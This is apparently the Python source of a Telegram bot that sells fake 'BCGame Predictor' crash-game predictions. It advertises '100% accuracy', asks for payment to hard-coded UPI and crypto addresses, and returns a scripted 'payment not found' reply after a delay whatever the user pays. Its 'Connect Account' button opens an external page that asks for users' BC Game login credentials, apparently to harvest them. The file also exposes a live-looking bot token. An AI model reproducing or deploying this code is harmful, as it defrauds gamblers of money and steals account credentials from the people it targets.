import telebot
from telebot import types
import requests
import json
import time
import sys

BOT_TOKEN = "7896799486:AAHWNk7UERiEfuIjnc2yn7_tTOvHR3IfIoM"
bot = telebot.TeleBot(BOT_TOKEN)

# Placeholder for TronScan API (simulated)
TRONSCAN_API_URL = "https://api.tronscan.org/api/transaction-info"
bot.delete_webhook()

# User status storage
PAID_USERS_FILE = "paid_users.json"
CONNECTED_USERS_FILE = "connected_users.json"

# Load user status from files
try:
    with open(PAID_USERS_FILE, "r") as f:
        paid_users = set(json.load(f))
except (FileNotFoundError, json.JSONDecodeError):
    paid_users = set()

try:
    with open(CONNECTED_USERS_FILE, "r") as f:
        connected_users = set(json.load(f))
except (FileNotFoundError, json.JSONDecodeError):
    connected_users = set()

def save_status():
    """Save user status to files"""
    with open(PAID_USERS_FILE, "w") as f:
        json.dump(list(paid_users), f)
    with open(CONNECTED_USERS_FILE, "w") as f:
        json.dump(list(connected_users), f)

def add_paid_user(user_id):
    """Add a user to the paid users list"""
    paid_users.add(user_id)
    save_status()

def add_connected_user(user_id):
    """Add a user to the connected users list"""
    connected_users.add(user_id)
    save_status()

def is_user_paid(user_id):
    """Check if user is in paid list"""
    return user_id in paid_users

def is_user_connected(user_id):
    """Check if user is in connected list"""
    return user_id in connected_users

# Admin commands
@bot.message_handler(commands=['addpaid'])
def handle_add_paid(message):
    if message.from_user.id in [6942741954, 7745903783]:  # Both admin IDs
        try:
            user_id_to_add = int(message.text.split()[1])
            add_paid_user(user_id_to_add)
            bot.reply_to(message, f"✅ User {user_id_to_add} added to paid users list.")
            
            try:
                bot.send_message(user_id_to_add, """Hello dear, 
🔸congratulations on your purchase of our VIP Club membership! 
🔸Thank you for choosing us. Now, take the next step by connecting your BCGame account to unlock prediction access. Exciting times lie ahead!""")
            except:
                pass
        except (IndexError, ValueError):
            bot.reply_to(message, "⚠️ Usage: /addpaid USER_ID")
    else:
        bot.reply_to(message, "🚫 You are not authorized to use this command.")

@bot.message_handler(commands=['userconnected'])
def handle_user_connected(message):
    if message.from_user.id in [6942741954, 7745903783]:  # Both admin IDs
        try:
            user_id_to_add = int(message.text.split()[1])
            add_connected_user(user_id_to_add)
            bot.reply_to(message, f"✅ User {user_id_to_add} marked as connected.")
            
            try:
                bot.send_message(user_id_to_add, """Dear user, 
♻Your BCGame account has been successfully connected. Please wait a few seconds for the update, then click on the 'PREDICTION' button to proceed.""")
            except:
                pass
        except (IndexError, ValueError):
            bot.reply_to(message, "⚠️ Usage: /userconnected USER_ID")
    else:
        bot.reply_to(message, "🚫 You are not authorized to use this command.")

@bot.message_handler(commands=['removeuser'])
def handle_remove_user(message):
    if message.from_user.id in [6942741954, 7745903783]:  # Both admin IDs
        try:
            user_id_to_remove = int(message.text.split()[1])
            
            removed_from_paid = user_id_to_remove in paid_users
            removed_from_connected = user_id_to_remove in connected_users
            
            if removed_from_paid:
                paid_users.remove(user_id_to_remove)
            if removed_from_connected:
                connected_users.remove(user_id_to_remove)
            
            save_status()
            
            status_message = f"✅ User {user_id_to_remove} removed from:"
            if removed_from_paid:
                status_message += "\n- Paid users list"
            if removed_from_connected:
                status_message += "\n- Connected users list"
            if not removed_from_paid and not removed_from_connected:
                status_message += "\n⚠️ User was not in either list"
                
            bot.reply_to(message, status_message)
            
        except (IndexError, ValueError):
            bot.reply_to(message, "⚠️ Usage: /removeuser USER_ID")
    else:
        bot.reply_to(message, "🚫 You are not authorized to use this command.")

@bot.message_handler(commands=['sendall'])
def handle_send_all(message):
    if message.from_user.id not in [6942741954, 7745903783]:  # Check if admin
        bot.reply_to(message, "🚫 You are not authorized to use this command.")
        return
        
    msg = bot.reply_to(message, "📝 Please enter the message you want to send to all users:")
    bot.register_next_step_handler(msg, process_send_all)

def process_send_all(message):
    if message.from_user.id not in [6942741954, 7745903783]:  # Double check authorization
        return
        
    admin_message = message.text
    all_users = paid_users.union(connected_users)  # Combine both sets to get all users
    
    if not all_users:
        bot.reply_to(message, "⚠️ No users found in the database.")
        return
        
    bot.reply_to(message, f"📤 Starting to send message to {len(all_users)} users...")
    
    success_count = 0
    fail_count = 0
    
    for user_id in all_users:
        try:
            bot.send_message(user_id, admin_message)
            success_count += 1
        except Exception as e:
            fail_count += 1
            
        # Update progress every 10 users
        if (success_count + fail_count) % 10 == 0:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=message.message_id + 1,
                text=f"📤 Sending... {success_count + fail_count}/{len(all_users)}\n"
                     f"✅ Success: {success_count}\n"
                     f"❌ Failed: {fail_count}"
            )
    
    # Final report
    bot.send_message(
        message.chat.id,
        f"📊 Message broadcast completed!\n\n"
        f"Total users: {len(all_users)}\n"
        f"✅ Successfully sent: {success_count}\n"
        f"❌ Failed to send: {fail_count}"
    )

@bot.message_handler(commands=['sendmsg'])
def handle_send_msg(message):
    if message.from_user.id not in [6942741954, 7745903783]:  # Check if admin
        bot.reply_to(message, "🚫 You are not authorized to use this command.")
        return
        
    try:
        # Extract user ID from command
        command_parts = message.text.split()
        if len(command_parts) < 2:
            raise ValueError
            
        user_id = int(command_parts[1])
        
        # Ask for the message to send
        msg = bot.reply_to(message, f"📝 Please enter the message you want to send to user {user_id}:")
        bot.register_next_step_handler(msg, lambda m: process_send_msg(m, user_id))
        
    except (IndexError, ValueError):
        bot.reply_to(message, "⚠️ Usage: /sendmsg USER_ID")

def process_send_msg(message, user_id):
    if message.from_user.id not in [6942741954, 7745903783]:  # Double check authorization
        return
        
    try:
        bot.send_message(user_id, message.text)
        bot.reply_to(message, f"✅ Message successfully sent to user {user_id}")
    except Exception as e:
        bot.reply_to(message, f"❌ Failed to send message to user {user_id}. Error: {str(e)}")

def notify_admin_user_prediction(user_id):
    """Notify both admins when a connected user requests predictions"""
    admin_ids = [6942741954, 7745903783]  # Both admin IDs
    for admin_id in admin_ids:
        try:
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton(
                "📩 Message User", 
                callback_data=f"message_user_{user_id}"
            ))
            
            bot.send_message(
                admin_id,
                f"🔔 User {user_id} has requested predictions\n\n"
                f"Account status: {'✅ Paid' if is_user_paid(user_id) else '❌ Not Paid'}\n"
                f"Connection status: {'✅ Connected' if is_user_connected(user_id) else '❌ Not Connected'}",
                reply_markup=markup
            )
        except Exception as e:
            print(f"Failed to notify admin {admin_id}: {e}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('message_user_'))
def handle_message_user(call):
    if call.from_user.id in [6942741954, 7745903783]:  # Both admin IDs
        user_id = int(call.data.split('_')[-1])
        msg = bot.send_message(
            call.message.chat.id,
            f"Enter message to send to user {user_id}:"
        )
        bot.register_next_step_handler(msg, lambda m: send_user_message(m, user_id))
    else:
        bot.answer_callback_query(call.id, "🚫 You are not authorized")

def send_user_message(message, user_id):
    try:
        bot.send_message(
            user_id,
            f"\n\n{message.text}"
        )
        bot.send_message(
            message.chat.id,
            f"✅ Message sent to user {user_id}"
        )
    except Exception as e:
        bot.send_message(
            message.chat.id,
            f"❌ Failed to send message to user {user_id}. They may have blocked the bot."
        )

@bot.message_handler(commands=['start'])
def welcome_message(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        types.KeyboardButton("Support 👤"), 
        types.KeyboardButton("Prediction🔮"), 
        types.KeyboardButton("Demo 🔎"), 
        types.KeyboardButton("Tutorial 🔹"),
        types.KeyboardButton("Connect ✅"), 
        types.KeyboardButton("Refer & Earn 🔗")
    ]
    markup.add(*buttons)
    
    welcome_text = """🌟 Welcome to BCGame Predictor 🌟

Hello, Dear User! 👋
Thank you for choosing our service. 🚀

🔹 Work with APIs for reliable BCGame predictions
🔹 Connect with BCGame APIs for real-time updates
🔹 Provide 100% accuracy in predictions
🔹 Verified by Telegram & Official Predictor (Bot Version: 4.0)

🔍 What's an API?
An API is a connector that interacts with the platform: API ➡️ BCGame ➡️ Predictions.\n\n
You need to Subscribe our all channels first:"""

    keyboard = [
        [types.InlineKeyboardButton("YouTube Channel", url="https://www.youtube.com/@Lkbbots")],
        [types.InlineKeyboardButton("Telegram Channel 1", url="https://t.me/BCGameMinerSucess")],
        [types.InlineKeyboardButton("Telegram Channel 2", url="https://t.me/bcgamepredection")]
    ]

    reply_markup = types.InlineKeyboardMarkup(keyboard)
    image_url = "https://firebasestorage.googleapis.com/v0/b/contactform-37fe3.appspot.com/o/coco.jpeg?alt=media&token=277b62a5-6cd5-4a42-8d9d-bb975f3c984e"
    bot.send_photo(message.chat.id, image_url, reply_markup=reply_markup, caption=welcome_text)
    bot.send_message(message.chat.id, "Please choose an option:", reply_markup=markup)

# Button handlers
@bot.message_handler(func=lambda message: True)
def handle_buttons(message):
    responses = {
        "Support 👤": """🗣️ For any technical support inquiries, please feel free to message us. Please note that response times may be delayed due to a high volume of users. 

✅ Paid users can expect a reply within 5 minutes, while non-members may experience longer wait times. Thank you for your understanding.""",
        "Tutorial 🔹": "📺 Watch our tutorial: https://youtube.com/shorts/sAfM7qNFv5U?si=LGwBcO6Ku5WElufD",
        "Refer & Earn 🔗": "📣 **Invite Friends & Earn Rewards!**\n🚀 **Join BCGameMiner & Refer Your Friends!**"
    }
    
    if message.text == "Connect ✅":
        handle_connect(message)
    elif message.text == "Refer & Earn 🔗":
        handle_refer(message)
    elif message.text == "Tutorial 🔹":
        handle_tutorial(message)
    elif message.text in responses:
        if message.text == "Support 👤":
            handle_support(message)
    elif message.text == "Prediction🔮":
        handle_prediction(message)
    elif message.text == "Demo 🔎":
        handle_demo(message)

def handle_connect(message):
    if is_user_connected(message.chat.id):
        bot.send_message(message.chat.id, "✅ Your account is already connected successfully!")
    else:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton(
            text="Connect Account",
            web_app=types.WebAppInfo(url="https://bcgametopgame.github.io/loginbcgame/")
        ))
        
        if is_user_paid(message.chat.id):
            message_text = """1. Click the Connect Account button below
2. Enter your BC Game credentials
3. Our system will verify and connect your account
            
🔒 Your login details are secured with Telegram's encryption"""
        else:
            message_text = """🔓 You can connect your account now!
            
1. Click the Connect Account button below
2. Enter your BC Game credentials
3. Our system will verify your account
            
Note: To access predictions, you'll need to purchase a premium plan after connecting."""

        bot.send_message(
            message.chat.id,
            message_text,
            reply_markup=markup
        )

def handle_refer(message):
    share_link = "https://t.me/vBCGamePredictor_Bot"
    share_message = """📣 Invite your friends and earn rewards!

🚀 Join our BcGameMiner community and invite your friends using this referral link. For each friend that clicks on the link and starts the bot, you'll get 1 referral point!

🔗 Referral Link: https://bc.fun/i-z42mzn9l-n/

👫 Invite 500 friends to earn amazing rewards together:
- Get rewarded with 50 USDT for every 500 successful referrals.
- Enjoy free access to our Plan Pro, exclusively for top referrers!

🚀🌟 You can also forward this post with your friends or in the bc.game chat. Spread the word and start earning now! 🌟🚀

To share your referral link in bc.game chat, simply copy and paste the following:
https://t.me/vBCGamePredictor_Bot""".format(link=share_link)

    bot.send_message(
        message.chat.id,
        share_message,
        reply_markup=types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton("Share Bot", url=f"https://t.me/share/url?url={share_link}&text={share_message}")
        )
    )

def handle_tutorial(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(
        text="Watch Tutorial on YouTube",
        url="https://youtube.com/shorts/sAfM7qNFv5U?si=LGwBcO6Ku5WElufD"
    ))
    bot.send_message(
        message.chat.id,
        "📺 Click the button below to watch the tutorial on YouTube:",
        reply_markup=markup
    )

def handle_support(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(
        text="Open Support Chat",
        url="https://t.me/BCGameKenny"
    ))
    bot.send_message(message.chat.id, """🗣 For any technical support inquiries, please feel free to message us. Please note that response times may be delayed due to a high volume of users. 

✅ Paid users can expect a reply within 5 minutes, while non-members may experience longer wait times. Thank you for your understanding.""", reply_markup=markup)

def handle_prediction(message):
    if is_user_paid(message.chat.id):
        if is_user_connected(message.chat.id):
            # Notify admin when connected user requests predictions
            notify_admin_user_prediction(message.chat.id)
            
            bot.send_message(message.chat.id, """Please wait...""")
        else:
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton(
                text="Connect Account",
                web_app=types.WebAppInfo(url="https://bcgametopgame.github.io/loginbcgame/")
            ))
            bot.send_message(message.chat.id, """Hello dear, 

🔸congratulations on your purchase of our VIP Club membership! 

🔸Thank you for choosing us. Now, take the next step by connecting your BCGame account to unlock prediction access. Exciting times lie ahead!""", reply_markup=markup)
    else:
        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton("UPI - (FAIT) 🇮🇳", callback_data="pay_inr"),
            types.InlineKeyboardButton("( Crypto )", callback_data="pay_crypto")
        )
        bot.send_message(message.chat.id, """🌟 Bot 2025/2026 : Exclusive Pricing Plans 🌟

1. ✨ Pro Plan:
Duration: 14 days
Access: Bot access key, 9 predictions/day
• 🇮🇳 India: ₹1999 (UPI)
• 🌐 Global: $38 (USDT), 444 (TRX), 0.0015 (BTC), 0.029 (ETH), 0.77 (LTC), 0.18 (BNB)
Features: Accurate predictions, Bot access

2. 💎 Legend Plan:
Duration: 28 days
Access: Bot access key, exclusive channel access, 48 predictions/day
• 🇮🇳 India: ₹4499 (UPI)
• 🌐 Global: $48 (USDT), 555 (TRX), 0.0021 (BTC), 0.038 (ETH), 0.97 (LTC), 0.26 (BNB)
Features: VIP predictions, Access to premium channels & bots

3. 🚀 Ninja Plan (Supreme):
Duration: 46 days
Benefits: Exclusive Ninja plan bot, BCGame Miner, Stake Game Miner, custom bot request
Special: 52% profit from referrals, unlimited predictions on Sundays
Limit: 100 predictions/day
• 🇮🇳 India: ₹6999 (UPI)
• 🌐 Global: $89 (USDT), 1001 (TRX), 0.0034 (BTC), 0.062 (ETH), 1.55 (LTC), 0.46 (BNB)
Features: Fastest support, VIP predictions, Unlimited access on Sundays, 24/7 support

📌 Note: Prices vary with different plans and affordability-specific features. Payments in India are through UPI, and globally through cryptocurrency.""", reply_markup=markup)

def handle_demo(message):
    games = get_game_predictions()
    if games:
        if is_user_paid(message.chat.id):
            response_text = "Next Game Predictions:\n\n"
        else:
            response_text = "Next Game Max Rate: Purchase key to unlock this feature🔒:\n\n"
            
        response_text += "Game ID  | Max Rate | Color\n"
        response_text += "-------------------------------------------\n"
        
        for game in games[:5]:
            try:
              
                game_id = game.get('gameId', 'N/A')
                game_detail = json.loads(game.get('gameDetail', '{}'))
                multiplier = float(game_detail.get('rate', 0))
                color = "🟥" if multiplier < 2 else "🟩" if multiplier < 10 else "🟨"
                response_text += f"   🎮Game ID:{game_id: <10}\n💹Max Rate | {multiplier: <7.2f}X | {color}\n-------------------------------------------\n"
            except json.JSONDecodeError:
                continue
        
        if not is_user_paid(message.chat.id):
            response_text += """\n🚀 Get accurate predictions for the next game! Join our plan and contact our customer support for help or purchasing a key.
📞 Contact: @BCGameKenny or Purchase Instantly: @BCMINE62PAY_Bot 👤"""

        image_url = "https://firebasestorage.googleapis.com/v0/b/contactform-37fe3.appspot.com/o/coco.jpeg?alt=media&token=277b62a5-6cd5-4a42-8d9d-bb975f3c984e"
        bot.send_photo(message.chat.id, image_url, caption=response_text)
    else:
        bot.send_message(message.chat.id, "⚠️ Failed to retrieve game results.")

def get_game_predictions():
    url = "https://bcgame.top/api/game/bet/multi/history"
    headers = {
        "Host": "bcgame.top",
        "Cookie": "SESSION=YOUR_SESSION_ID",  # WARNING: Static session
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Origin": "https://bcgame.top",
        "Referer": "https://bcgame.top/game/crash"
    }
    data = {"gameUrl": "crash", "page": 1, "pageSize": 5}
    try:
        response = requests.post(url, headers=headers, json=data, timeout=10)
        response.raise_for_status()  # Raise HTTP errors
        return response.json().get("data", {}).get("list", [])
    except Exception as e:
        print(f"API Error: {str(e)}")
        if hasattr(e, 'response') and e.response:
            print(f"Status Code: {e.response.status_code}")
            print(f"Response Text: {e.response.text[:200]}")
        return None

# Callback handlers (payment processing)
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "pay_inr":
        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton("Generate QR", callback_data="generate_qr"),
            types.InlineKeyboardButton("UPI - 🇮🇳", callback_data="pay_upi")
        )
        bot.send_message(call.message.chat.id, """🌟 UPI (FAIT 🇮🇳) Payment Guide 🌟

Welcome! Please follow these steps to complete your payment via UPI:

🔹 Step 1: Generate QR Code
Tap on "🔳 Generate QR Code" to view the payment QR code.

🔹 Step 2: Select Your Plan and Pay
Pay the amount matching your chosen plan:
- 🟢 Plan Pro: ₹1999
- 🔵 Plan Legend: ₹4499
- 🟣 Plan Ninja: ₹6999

🔹 Step 3: Verify Your Payment
After completing the payment:
- Tap "✅ Verify"
- Submit the UTR (Unique Transaction Reference) code provided by your bank.""", reply_markup=markup)
    
    elif call.data == "generate_qr":
        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton("Verify ✅", callback_data="verify"),
            types.InlineKeyboardButton("Back 🔙", callback_data="pay_inr")
        )
        qr_image_url = "https://firebasestorage.googleapis.com/v0/b/contactform-37fe3.appspot.com/o/qrcode.jpg?alt=media&token=0c72ff26-47a9-43b6-a5af-7cc4e827f556"
        bot.send_photo(call.message.chat.id, qr_image_url, caption="""🔹 UPI (QR Code) Payment Option 2 🔹

💠 Instructions for QR Payment:

1. Scan QR Code - Use any UPI-enabled app like Paytm, Google Pay, PhonePe, etc.

2. Enter Amount - As per your chosen plan: 

1. 🟢₹1999 for Plan Pro.

2. 🔵₹4499 for plan Legend.

3. 🟣₹6999 for plan Ninja.""",reply_markup=markup)
    elif call.data == "pay_upi":
        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton("Verify ✅", callback_data="verify"),
            types.InlineKeyboardButton("Back 🔙", callback_data="pay_inr"),
            
        )
        bot.send_message(call.message.chat.id,"""🔹 UPI (UPI Method ) Payment Option 1 🔹

💠 Instructions for UPI Payment:

1. Scan QR Code or  Use any UPI-enabled app like Paytm, Google Pay, PhonePe, etc.

UPI ID : `bcgameplans@pnb`. (( tap to copy ))
                         
2. Enter Amount - As per your chosen plan: 

1. 🟢₹1999 for Plan Pro.

2. 🔵₹4499 for plan Legend.

3. 🟣₹6999 for plan Ninja.""",reply_markup=markup,parse_mode="Markdown" )
         
    elif call.data == "pay_crypto":
        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton("Copy", callback_data="copya"),
            types.InlineKeyboardButton("Back 🔙", callback_data="back")
        )
        qr_image_url = "https://firebasestorage.googleapis.com/v0/b/contactform-37fe3.appspot.com/o/cryptoaddress.jpg?alt=media&token=dbcf8670-7fd9-4f19-a061-940f8cc46cfe"
        bot.send_photo(call.message.chat.id, qr_image_url, caption="""Cryptocurrency Transfer Payment Option (Worldwide) 🌍

1. Deposit Address (Tap to copy)📋:

TVU729kjJcTM8GokCvduofxpK8RzmdY1Su

2. Send USDT to the Address and Select Network as TRC20 🚀

Network: USDT/TRC20

💰 Please send the amount for your Choosen plan to the provided address:

- 38 USDT for Pro Plan
- 48 USDT for Legend Plan
- 89 USDT for Ninja Plan

Your key will correspond to the plan you choose: Pro, Legend, or Ninja.

⚡ Your key will be unlocked instantly once the transaction is completed.

(Note: Press 'Confirm' button after the payment is successfully sent and received on the provided address.) 🎉

Status: Waiting for transaction (updated every second) ⏳""", reply_markup=markup)
       
    elif call.data == "copya":
        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton("Verify", callback_data="verify_c"),
            types.InlineKeyboardButton("Back 🔙", callback_data="back")
        )
        crypto_address = "TToqgbfojAQ94yY3cUPawEaDZMqfn3Hzqn"
        bot.send_message(call.message.chat.id, f"Wallet address:\n\n`{crypto_address}`\n\nPlease copy it manually.", parse_mode="Markdown")
        bot.send_message(call.message.chat.id, "Click 'Verify' after making the payment or 'Back' to return.", reply_markup=markup)
        
    elif call.data == "verify_c":
        msg = bot.send_message(call.message.chat.id, "Enter transaction hash")
        bot.register_next_step_handler(msg, cryptohash)
            
    elif call.data == "verify":
        msg = bot.send_message(call.message.chat.id, "Enter your 12-digit UTR:")
        bot.register_next_step_handler(msg, send_success)
    elif call.data == "back":
        welcome_message(call.message)
    elif call.data.startswith('message_user_'):
        handle_message_user(call)

def send_success(message): 
    bot.send_message(message.chat.id, "Verifying your payment...") 
    time.sleep(3)

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(
                text="Open Support Chat",
                web_app=types.WebAppInfo(url="https://bcgametopgame.github.io/chat/chat.html")
            ))

    bot.send_message(message.chat.id, """Payment not found. The transaction was not found, indicating that the payment has not been received yet. Please ensure you have made the payment and provide the correct UTR (reference number) when prompted. If you need any help or have questions, don't hesitate to reach out to our support team via the 'Support' option in the main menu.

Thank you for your understanding and cooperation. We are here to assist you throughout the process.""",reply_markup=markup)

def cryptohash(message): 
    bot.send_message(message.chat.id, "Verifying your payment from the blockchain...") 
    time.sleep(3)

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(
                text="Open Support Chat",
                web_app=types.WebAppInfo(url="https://bcgametopgame.github.io/chat/chat.html")
            ))
    bot.send_message(message.chat.id, """Payment Verification Failed ⚠️

Please check the following before resending your details:

• Correct Address 📋: Ensure you have paid to the correct cryptocurrency address.
• Correct Amount 💸: Ensure the amount matches the plan you selected.
• Blockchain Verification ⏳: If your payment is under blockchain verification, please wait for confirmation.

Resend the correct details or a screenshot of the payment. For assistance, click 'Menu' or contact our support team 📞.,""", reply_markup=markup) 

def run_bot():
    while True:
        try:
            print("🚀 Bot is running...")
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"⚠️ Bot crashed with error: {e}")
            print("🔄 Restarting bot in 5 seconds...")
            time.sleep(2)

run_bot()
